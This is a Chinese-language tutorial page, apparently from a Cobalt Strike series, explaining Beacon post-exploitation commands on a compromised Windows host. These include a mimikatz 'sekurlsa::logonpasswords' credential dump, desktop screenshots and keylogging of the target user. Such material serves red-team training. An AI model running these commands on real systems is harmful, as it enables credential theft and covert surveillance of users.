<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cobalt-strike-beacon-基础信息搜集"><span class="csDE05BCC">Cobalt Strike Beacon </span><span class="csECDA2D3">基础信息搜集</span></a></h1>
		<p class="cs3A447A38"><span class="cs9FB05234">getuid </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">查看当前</span><span class="cs9FB05234"> shell </span><span class="cs7FFD2630">权限</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">如下可以看到</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">当前是以系统内建的</span><span class="cs9FB05234"> administrator </span><span class="cs7FFD2630">用户权限在操作</span></p><p class="cs3A447A38"><span class="cs9FB05234">ps </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">查看当前系统进程列表</span><span class="cs9FB05234"> [ </span><span class="cs7FFD2630">默认它已经事先把</span><span class="cs9FB05234"> 64 </span><span class="cs7FFD2630">位和</span><span class="cs9FB05234"> 32 </span><span class="cs7FFD2630">进程区分清楚了</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">这也是为什么不去用系统自带的</span><span class="cs9FB05234"> tasklist </span><span class="cs7FFD2630">工具的原因</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">比如</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">后面某些功能就需要你明确指明目标进程是</span><span class="cs9FB05234"> 32 </span><span class="cs7FFD2630">还是</span><span class="cs9FB05234"> 64 </span><span class="cs7FFD2630">位的</span><span class="cs9FB05234"> ]</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_基础功能与介绍/Cobalt_Strike_命令详情/Cobalt%20Strike%20Beacon%20%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86_files/image0.png" width="560" height="300" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">kill 3292 </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">杀掉指定</span><span class="cs9FB05234"> id </span><span class="cs7FFD2630">的进程</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">比如</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">杀掉这个记事本进程</span></p><p class="cs3A447A38"><span class="cs9FB05234">shell query user </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">执行</span><span class="cs9FB05234"> win </span><span class="cs7FFD2630">系统的各种原生</span><span class="cs9FB05234"> cmd </span><span class="cs7FFD2630">命令</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">命令参数正常带上执行即可</span></p><p class="cs3A447A38"><span class="cs9FB05234">shell mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">shell </span><span class="cs7FFD2630">也可以用来执行自己上传的一些</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">命令行程序</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">比如</span><span class="cs9FB05234">,mimikatz.exe </span><span class="cs7FFD2630">执行完之后它会把执行的结果再回显回来</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_基础功能与介绍/Cobalt_Strike_命令详情/Cobalt%20Strike%20Beacon%20%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86_files/image1.png" width="560" height="239" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">execute mimikatz.exe &quot;log&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">跟</span><span class="cs9FB05234"> shell </span><span class="cs7FFD2630">功能有所不同</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">同样都是执行指定命令行程序</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">但</span><span class="cs9FB05234"> shell </span><span class="cs7FFD2630">会把执行结果回显回来</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">而</span><span class="cs9FB05234"> execute </span><span class="cs7FFD2630">则不会</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">至于到底执行成功没</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">还需要用其它方式来判断</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_基础功能与介绍/Cobalt_Strike_命令详情/Cobalt%20Strike%20Beacon%20%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86_files/image2.png" width="560" height="97" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">特别注意这个截屏功能</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为我们现在是在正常的</span><span class="cs8926E06"> administrator </span><span class="cs9C1B1871">用户权限下操作的</span><span class="cs8926E06">[</span><span class="cs9C1B1871">标准用户环境</span><span class="cs8926E06">],</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">,</span><span class="cs9C1B1871">通过</span><span class="cs8926E06"> explorer.exe </span><span class="cs9C1B1871">就直接能截取到目标桌面</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如果你当前是在</span><span class="cs8926E06"> system </span><span class="cs9C1B1871">权限下则必须先把自己降权或切换到一个正常的正在线系统用户权限上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这样才能正常截到目标桌面</span></p><p class="cs3A447A38"><span class="cs9FB05234">screenshot x64 2656 1</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">对用户桌面进行截屏</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_基础功能与介绍/Cobalt_Strike_命令详情/Cobalt%20Strike%20Beacon%20%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86_files/image3.png" width="560" height="252" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_基础功能与介绍/Cobalt_Strike_命令详情/Cobalt%20Strike%20Beacon%20%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86_files/image4.png" width="560" height="220" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">keylogger 2656 x64 </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">常规键盘记录</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">同样还是指定</span><span class="cs9FB05234"> explorer.exe </span><span class="cs7FFD2630">进程进行截获</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_基础功能与介绍/Cobalt_Strike_命令详情/Cobalt%20Strike%20Beacon%20%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86_files/image5.png" width="560" height="213" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">如下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们看到中文显示乱码了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">很正常</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为我们用的这个</span><span class="cs8926E06"> CobaltStrike,</span><span class="cs9C1B1871">几乎是原生的默认也没有调整编码</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不用太在意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">后期等整个系列全部更新完</span><span class="cs8926E06">,</span><span class="cs9C1B1871">视情况也许会给大家一个调整好的用</span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
</html>
